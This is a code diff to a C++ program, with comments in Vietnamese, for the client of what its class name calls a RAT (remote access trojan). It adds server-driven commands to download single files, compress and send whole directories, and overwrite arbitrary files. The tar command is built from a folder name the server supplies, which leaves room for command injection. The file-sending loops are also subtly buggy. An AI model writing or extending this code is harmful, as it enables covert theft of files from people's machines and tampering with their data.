@@ -46,6 +46,9 @@ class FileManager {
 public:
     SocketClient client;
     void HandleList();
+    void HandleEditFile(const std::string& filename);
+    void HandleDownload(const std::string& filename);
+    void HandleDownloadDir(const std::string& foldername);
 };
 
 // Hàm xử lý lệnh LIST (Liệt kê file)
@@ -76,6 +79,113 @@ void FileManager::HandleList() {
 
     // Gửi toàn bộ kết quả trả về cho Server qua Socket
     client.Send(result);
+}
+
+// Hàm xử lý việc thay đổi nội dung file từ xa
+void FileManager::HandleEditFile(const std::string& filename) {
+    
+    // 1. Gửi tín hiệu thông báo sẵn sàng nhận nội dung mới
+    std::string readyMsg = "READY_FOR_CONTENT";
+    client.Send(readyMsg.c_str());
+
+    // 2. Nhận nội dung mới từ Server (đặt cấu hình tạm thời nhận dữ liệu)
+    auto newContent = client.Receive();
+    if (newContent.empty()) {
+        std::cout << "[-] Mat ket noi khi dang nhan noi dung file.\n" << std::endl;
+        return;
+    }
+
+    // 3. Tiến hành ghi đè nội dung vào file
+    std::ofstream file(filename, std::ios::trunc | std::ios::binary); // std::ios::trunc để ghi đè dữ liệu cũ
+    std::string statusMsg;
+
+    if (!file.is_open()) {
+        statusMsg = "ERROR: Khong the mo hoặc tao file de ghi tren Client.\n";
+    } else {
+        file.write(newContent.c_str(), newContent.length());
+        file.close();
+        statusMsg = "SUCCESS: Da cap nhat noi dung file '" + filename + "' thanh cong.\n";
+    }
+
+    // 4. Gửi báo cáo kết quả về Server
+    client.Send(statusMsg);
+    std::cout << "[+] Thuc hien EDITFILE " << filename << ": " << statusMsg << std::endl;
+}
+
+// Hàm xử lý lệnh GET (Tải file)
+void FileManager::HandleDownload(const std::string& filename) {
+    std::ifstream file(filename, std::ios::binary);
+    if (!file.is_open()) {
+        std::string msg = "ERROR: Khong the mo file.\n";
+        client.Send(msg);
+        return;
+    }
+
+    // Thông báo cho Server biết file hợp lệ và chuẩn bị gửi
+    client.Send("START");
+    usleep(100000); // Ngủ 100ms (100,000 microseconds) để tránh dính gói tin (TCP Coalescing)
+
+    char buffer[BUFFER_SIZE];
+    while (file.read(buffer, sizeof(buffer))) {
+        client.Send(buffer);
+    }
+    // Gửi nốt phần dữ liệu còn lại nếu nhỏ hơn BUFFER_SIZE
+    if (file.gcount() > 0) {
+        client.Send(buffer);
+    }
+    
+    file.close();
+    std::cout << "[+] Da gui xong file: " << filename << std::endl;
+}
+
+// Hàm xử lý tải toàn bộ Folder (Nén lại rồi gửi)
+void FileManager::HandleDownloadDir(const std::string& foldername) {
+    if (!fs::exists(foldername) || !fs::is_directory(foldername)) {
+        std::string msg = "ERROR: Thu muc khong ton tai.\n";
+        client.Send(msg);
+        return;
+    }
+
+    fs::path absolutePath = fs::absolute(foldername);
+    std::string parentDir = absolutePath.parent_path().string();
+    std::string dirName = absolutePath.filename().string();
+
+    std::string tarCmd = "tar -czf archive.tar.gz -C \"" + parentDir + "\" \"" + dirName + "\"";
+    
+    // Thực hiện nén trước
+    int res = system(tarCmd.c_str());
+    if (res != 0) {
+        std::string msg = "ERROR: Khong the nen thu muc.\n";
+        client.Send(msg);
+        return;
+    }
+
+    // Mở file sau khi nén thành công
+    std::ifstream file("archive.tar.gz", std::ios::binary);
+    if (!file.is_open()) {
+        std::string msg = "ERROR: Khong the mo file archive.\n";
+        client.Send(msg);
+        return;
+    }
+
+    // Gửi tín hiệu thông báo cho Server: Mọi thứ đã sẵn sàng
+    std::string startMsg = "START";
+    client.Send(startMsg);
+    
+    // Ngủ 200ms để Server kịp nhận gói START tách biệt hoàn toàn với gói dữ liệu file tiếp theo
+    usleep(200000); 
+
+    char buffer[BUFFER_SIZE];
+    while (file.read(buffer, sizeof(buffer))) {
+        client.Send(buffer);
+    }
+    if (file.gcount() > 0) {
+        client.Send(buffer);
+    }
+    file.close();
+
+    fs::remove("archive.tar.gz");
+    std::cout << "[+] Da nén va gui xong folder qua socket!\n";
 }
 
 
@@ -151,6 +261,18 @@ void RatClient::CommandLoop() {
 void RatClient::HandleCommand(const std::string& command) {
     if (command == "LIST") {
         fileManager.HandleList();
+    } 
+    else if (command.rfind("GETFILE ", 0) == 0) {
+        std::string filename = command.substr(8);
+        fileManager.HandleDownload(filename); // Hàm HandleDownload cũ của bạn
+    }
+    else if (command.rfind("GETDIR ", 0) == 0) {
+        std::string foldername = command.substr(7);
+        fileManager.HandleDownloadDir(foldername);
+    }
+    else if (command.rfind("EDITFILE ", 0) == 0) { // Thêm nhánh xử lý lệnh EDITFILE
+        std::string filename = command.substr(9);
+        fileManager.HandleEditFile(filename);
     }
 }
 
